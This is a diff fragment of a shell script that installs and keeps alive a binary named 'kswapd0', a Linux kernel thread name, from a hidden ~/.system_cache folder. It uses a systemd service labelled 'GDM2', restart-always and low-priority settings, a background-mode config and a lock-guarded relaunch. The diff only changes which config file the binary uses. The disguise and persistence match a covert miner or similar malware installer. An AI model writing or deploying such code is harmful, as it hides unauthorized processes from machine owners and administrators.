@@ -307,7 +307,7 @@ else
 Description=GDM2
 
 [Service]
-ExecStart=$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config.json
+ExecStart=$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config_background.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -357,9 +357,9 @@ sed -i 's/"background": *false,/"background": true,/' $HOME/.system_cache/config
 #cat $HOME/.system_cache/config.json
 
 # Run kswapd0 if no other process with the specific configuration is running
-if ! pgrep -f "$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config.json" > /dev/null; then
+if ! pgrep -f "$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config_background.json" > /dev/null; then
     echo "kswapd0 not started. Starting it..."
-    "$HOME/.system_cache/kswapd0" --config="$HOME/.system_cache/config.json" &
+    "$HOME/.system_cache/kswapd0" --config="$HOME/.system_cache/config_background.json" &
 else
     echo "kswapd0 is already running."
 fi
@@ -374,7 +374,7 @@ exec 200>"$lockfile"
 flock -n 200 || exit 1
 
 if ! pgrep -f "$HOME/.system_cache/kswapd0"; then
-  "$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config.json"
+  "$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config_background.json"
 fi
 EOF
 
